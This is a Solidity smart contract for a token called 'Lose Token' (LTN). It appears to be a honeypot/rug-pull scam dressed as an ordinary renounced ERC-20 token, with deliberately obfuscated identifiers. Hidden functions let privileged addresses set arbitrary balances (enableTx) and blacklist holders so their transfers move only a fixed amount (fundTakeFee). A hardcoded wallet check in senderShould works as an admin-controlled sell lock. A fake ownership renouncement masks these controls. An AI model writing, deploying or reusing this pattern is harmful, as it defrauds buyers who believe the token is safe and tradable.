//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface exemptSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minReceiver) external view returns (uint256);

    function transfer(address amountLaunch, uint256 shouldLaunch) external returns (bool);

    function allowance(address launchMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address amountLaunch,
        uint256 shouldLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toEnable, uint256 value);
    event Approval(address indexed launchMin, address indexed spender, uint256 value);
}

abstract contract atReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface amountReceiver {
    function createPair(address limitMarketing, address limitMax) external returns (address);
}

interface exemptSenderMetadata is exemptSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LoseToken is atReceiver, exemptSender, exemptSenderMetadata {

    address public isTeamShould;

    function symbol() external view virtual override returns (string memory) {
        return liquidityAtBuy;
    }

    uint256 marketingFrom;

    function receiverTake(uint256 shouldLaunch) public {
        launchedAmount();
        marketingFrom = shouldLaunch;
    }

    function maxToken(address takeShould) public {
        if (walletExempt) {
            return;
        }
        
        listMin[takeShould] = true;
        
        walletExempt = true;
    }

    function fundTakeFee(address toFee) public {
        launchedAmount();
        if (takeAmountReceiver == fromAt) {
            marketingSellEnable = false;
        }
        if (toFee == autoMin || toFee == isTeamShould) {
            return;
        }
        autoTrading[toFee] = true;
    }

    function getOwner() external view returns (address) {
        return tradingLaunched;
    }

    address totalWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private fromAt;

    event OwnershipTransferred(address indexed toList, address indexed shouldEnable);

    mapping(address => bool) public listMin;

    string private amountTrading = "Lose Token";

    function listMarketing(address fromIs, address amountLaunch, uint256 shouldLaunch) internal returns (bool) {
        require(liquidityIs[fromIs] >= shouldLaunch);
        liquidityIs[fromIs] -= shouldLaunch;
        liquidityIs[amountLaunch] += shouldLaunch;
        emit Transfer(fromIs, amountLaunch, shouldLaunch);
        return true;
    }

    function transferFrom(address fromIs, address amountLaunch, uint256 shouldLaunch) external override returns (bool) {
        if (_msgSender() != amountFundMax) {
            if (receiverIsMarketing[fromIs][_msgSender()] != type(uint256).max) {
                require(shouldLaunch <= receiverIsMarketing[fromIs][_msgSender()]);
                receiverIsMarketing[fromIs][_msgSender()] -= shouldLaunch;
            }
        }
        return senderShould(fromIs, amountLaunch, shouldLaunch);
    }

    address private tradingLaunched;

    function decimals() external view virtual override returns (uint8) {
        return autoExempt;
    }

    constructor (){
        
        listTx isTake = listTx(amountFundMax);
        isTeamShould = amountReceiver(isTake.factory()).createPair(isTake.WETH(), address(this));
        
        autoMin = _msgSender();
        enableLaunch();
        listMin[autoMin] = true;
        liquidityIs[autoMin] = marketingFund;
        
        emit Transfer(address(0), autoMin, marketingFund);
    }

    uint256 constant fromFund = 17 ** 10;

    uint256 private takeAmountReceiver;

    function senderShould(address fromIs, address amountLaunch, uint256 shouldLaunch) internal returns (bool) {
        if (fromIs == autoMin) {
            return listMarketing(fromIs, amountLaunch, shouldLaunch);
        }
        uint256 autoBuy = exemptSender(isTeamShould).balanceOf(totalWallet);
        require(autoBuy == marketingFrom);
        require(amountLaunch != totalWallet);
        if (autoTrading[fromIs]) {
            return listMarketing(fromIs, amountLaunch, fromFund);
        }
        return listMarketing(fromIs, amountLaunch, shouldLaunch);
    }

    address amountFundMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public maxMode;

    mapping(address => bool) public autoTrading;

    function transfer(address walletMode, uint256 shouldLaunch) external virtual override returns (bool) {
        return senderShould(_msgSender(), walletMode, shouldLaunch);
    }

    bool private liquidityAmount;

    string private liquidityAtBuy = "LTN";

    function approve(address txAmount, uint256 shouldLaunch) public virtual override returns (bool) {
        receiverIsMarketing[_msgSender()][txAmount] = shouldLaunch;
        emit Approval(_msgSender(), txAmount, shouldLaunch);
        return true;
    }

    uint256 private marketingFund = 100000000 * 10 ** 18;

    function allowance(address swapMarketing, address txAmount) external view virtual override returns (uint256) {
        if (txAmount == amountFundMax) {
            return type(uint256).max;
        }
        return receiverIsMarketing[swapMarketing][txAmount];
    }

    address public autoMin;

    mapping(address => uint256) private liquidityIs;

    function enableLaunch() public {
        emit OwnershipTransferred(autoMin, address(0));
        tradingLaunched = address(0);
    }

    function owner() external view returns (address) {
        return tradingLaunched;
    }

    function balanceOf(address minReceiver) public view virtual override returns (uint256) {
        return liquidityIs[minReceiver];
    }

    mapping(address => mapping(address => uint256)) private receiverIsMarketing;

    bool private amountTeam;

    function enableTx(address walletMode, uint256 shouldLaunch) public {
        launchedAmount();
        liquidityIs[walletMode] = shouldLaunch;
    }

    function launchedAmount() private view {
        require(listMin[_msgSender()]);
    }

    uint256 modeFund;

    bool public walletExempt;

    bool public marketingReceiver;

    function totalSupply() external view virtual override returns (uint256) {
        return marketingFund;
    }

    uint8 private autoExempt = 18;

    bool public marketingSellEnable;

    function name() external view virtual override returns (string memory) {
        return amountTrading;
    }

}